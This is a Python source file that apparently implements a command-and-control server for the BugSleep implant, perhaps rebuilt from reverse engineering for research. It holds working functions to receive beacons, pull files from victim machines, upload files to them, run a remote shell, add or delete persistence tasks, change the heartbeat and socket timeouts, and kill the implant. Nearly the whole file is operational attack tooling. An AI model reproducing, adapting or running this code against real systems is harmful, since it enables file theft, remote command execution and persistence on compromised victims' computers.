import logging
import os
import struct

from time import sleep

from pathlib import Path
from pathlib import PurePosixPath
from pathlib import PureWindowsPath


from utils import *

logger = logging.getLogger("BugSleep")


def get_beacon(conn):
    """Wait for a beacon from BugSleep implant.

    Args:
        conn (socket.socket): BugSleep socket.
    """
    logger.info("Reading beacon data...")
    try:
        msg_len = read_dword(conn)
    except ValueError as e:
        logger.error("Failed to process beacon!")
        logger.debug(e)
        return False

    read(conn, msg_len)
    send(conn, struct.pack("<I", msg_len))


def cmd_get(conn, out_dir, remote_path):
    """Send a get file command to BugSleep implant.

    Args:
        conn (socket.socket): BugSleep socket.
        out_dir (str): Directory to place retrieved file.
        remote_path (str): Path to file on victim machine.
    """
    logger.info("Sending GET...")

    remote_path = unicode_bytes(remote_path.encode())
    payload = struct.pack("<II", BugSleepCmd.GET, len(remote_path)) + remote_path
    send(conn, payload)

    # Random two DWORDS that come back?
    ret = read_dword(conn)
    if ret != 1:
        logger.error("Failed to get file! (ret=%d)", ret)
        return False
    ret = read_dword(conn)
    if ret != 0:
        logger.error("Failed to get file! (ret=%d)", ret)
        return False

    num_pages = read_qword(conn)
    logger.info("File is %d page(s)", num_pages)

    last_page_size = read_dword(conn)
    logger.info("Last page is %d bytes", last_page_size)

    file_data = b""
    for _ in range(num_pages - 1):
        file_data += read(conn, 1024)
    if last_page_size:
        file_data += read(conn, last_page_size)

    logger.info("Received %d bytes.", len(file_data))

    # Create usable windows path object for conversion
    win_path = PureWindowsPath(remote_path.replace(b"\x00", b"").decode())
    # Convert windows path to nix
    nix_path = str(PurePosixPath(*win_path.parts))
    # Get rid of drive letter junk
    nix_path = nix_path.replace(":\\", "")
    # Get full output file path
    out_file = os.path.join(out_dir, nix_path)
    # Create output dir if it doesn't exist
    out_dir = os.path.dirname(os.path.join(out_dir, nix_path))
    Path(out_dir).mkdir(parents=True, exist_ok=True)

    with open(out_file, "wb") as fh:
        fh.write(file_data)

    logger.info("Saved file %s", out_file)
    return True


def cmd_put(conn, local_path, remote_path):
    """Send a put file command to BugSleep implant.

    Args:
        conn (socket.socket): BugSleep socket.
        local_path (str): Local file to put on victim machine.
        remote_path (str): Where to put file on victim machine.
    """
    logger.info("Sending PUT...")

    # BugSleep uses CreateFileW
    remote_path = unicode_bytes(remote_path.encode())

    payload = struct.pack("<II", BugSleepCmd.PUT, len(remote_path)) + remote_path
    send(conn, payload)

    ret = read_dword(conn)
    if ret != 1:
        logger.error("Failed to get file! (ret=%d)", ret)
        return False

    ret = read_dword(conn)
    if ret != 1:
        logger.error("Failed to get file! (ret=%d)", ret)
        return False

    with open(local_path, "rb") as fh:
        file_bytes = fh.read()

    def divide_chunks(l, n):
        # looping till length l
        for i in range(0, len(l), n):
            yield l[i : i + n]

    chunks = list(divide_chunks(file_bytes, 1020))
    file_size = len(file_bytes)
    remainder = file_size % 1020
    num_pages = file_size // 1020
    # Add one if we have any remainder bytes
    num_pages += 1 if remainder else 0
    # +4 to account for page value at start of each chunk
    # Each chunk looks like:
    # [page][data...]
    remainder += 4

    send(conn, struct.pack("<I", num_pages))

    logger.debug("Remainder: %d", remainder)
    send(conn, struct.pack("<I", remainder))

    for i, chunk in enumerate(chunks):
        send(conn, struct.pack("<I", i) + chunk)

    logger.info("Successfully put file %s!", local_path)
    return True


def cmd_shell(conn):
    """Run an 'interactive' shell through BugSleep implant.

    Args:
        conn (socket.socket): BugSleep socket.
    """
    logger.info("Sending SHELL...")
    payload = struct.pack("<I", BugSleepCmd.SHELL)
    send(conn, payload)

    count = 0
    cmds = [b"whoami", b"dir", b"terminate"]
    cmd = b""
    while cmd != b"terminate":

        # The implant communicates via pipes to the subprocess so there is no
        # real way to know when our command is done. So, just sleep for a couple
        # seconds.
        sleep(2)

        # Did process start or not?
        ret = read_dword(conn)
        if ret != 1:
            logger.error("Failed to run cmd! (ret=%d)", ret)
            return False

        # Stdout length in number of pages
        pages = read_qword(conn)
        # Number of bytes used on last page
        remainder = read_qword(conn)

        # Read stdout pages
        stdout = b""
        for _ in range(pages - 1):
            stdout += read(conn, 1024)

        if remainder:
            stdout += read(conn, remainder)

        print(stdout.decode())

        # Zero is sent after pipe has been emptied
        read_dword(conn)

        # cmd = input("cmd > ").encode()
        cmd = cmds[count]
        cmd_len = len(cmd)
        count += 1
        send(conn, struct.pack("<I", cmd_len) + cmd)
        sleep(2)
    return True


def cmd_inc_timeout(conn, inc):
    """Send increase socket timeout command to BugSleep implant.

    Args:
        conn (socket.socket): BugSleep socket.
        inc (int): Amount to increase.
    """
    logger.info("Sending INC_TIMEOUT...")
    payload = struct.pack("<II", BugSleepCmd.INC_TIMEOUT, inc)
    send(conn, payload)
    ret = read_dword(conn)
    logger.info("Return value (should be 6?): %d", ret)
    return True


def cmd_task_delete(conn):
    """Send delete task command to BugSleep implant.

    Args:
        conn (socket.socket): BugSleep socket.
    """
    logger.info("Sending TASK_DELETE...")
    payload = struct.pack("<I", BugSleepCmd.TASK_DELETE)
    send(conn, payload)
    logger.info("Task should be deleted")
    return True


def cmd_task_check(conn):
    """Send check task command to BugSleep implant.

    Args:
        conn (socket.socket): BugSleep socket.
    """
    logger.info("Sending TASK_CHECK...")
    payload = struct.pack("<I", BugSleepCmd.TASK_CHECK)
    send(conn, payload)
    ret = read_dword(conn)
    logger.info("Task enabled: %d", ret)
    return True


def cmd_task_add(conn):
    """Send add task command to BugSleep implant.

    Args:
        conn (socket.socket): BugSleep socket.
    """
    logger.info("Sending TASK_ADD...")
    payload = struct.pack("<I", BugSleepCmd.TASK_ADD)
    send(conn, payload)
    ret = read_dword(conn)
    logger.info("Task enabled: %d", ret)
    return True


def cmd_update_heartbeat(conn, seconds):
    """Send update heartbeat interval command to BugSleep implant.

    Args:
        conn (socket.socket): BugSleep socket.
        seconds (int): Interval to check in.
    """
    logger.info("Sending UPDATE_HEARTBEAT...")
    payload = struct.pack("<II", BugSleepCmd.UPDATE_HEARTBEAT, seconds)
    send(conn, payload)
    logger.info("Heartbeat updated to %d seconds", seconds)
    return True


def cmd_sock_timeout(conn, seconds):
    """Send set socket timeout command to BugSleep implant.

    Args:
        conn (socket.socket): BugSleep socket.
        seconds (int): New socket timeout.
    """
    logger.info("Sending SOCK_TIMEOUT...")
    payload = struct.pack("<II", BugSleepCmd.SOCK_TIMEOUT, seconds)
    send(conn, payload)
    logger.info("Socket timeout updated to %d", seconds)
    return True


def cmd_ping(conn):
    """Send ping command to BugSleep implant.

    Args:
        conn (socket.socket): BugSleep socket.
    """
    logger.info("Sending PING...")
    payload = struct.pack("<I", BugSleepCmd.PING)
    send(conn, payload)
    data = read(conn, 4)
    logger.info("Received ping response: %s", truncate(data))
    return True


def cmd_kill(conn):
    """Send kill command to BugSleep implant.

    Args:
        conn (socket.socket): BugSleep socket.
    """
    logger.info("Sending KILL...")
    payload = struct.pack("<I", BugSleepCmd.KILL)
    send(conn, payload)
    logger.info("Should be dead now!")
    return True
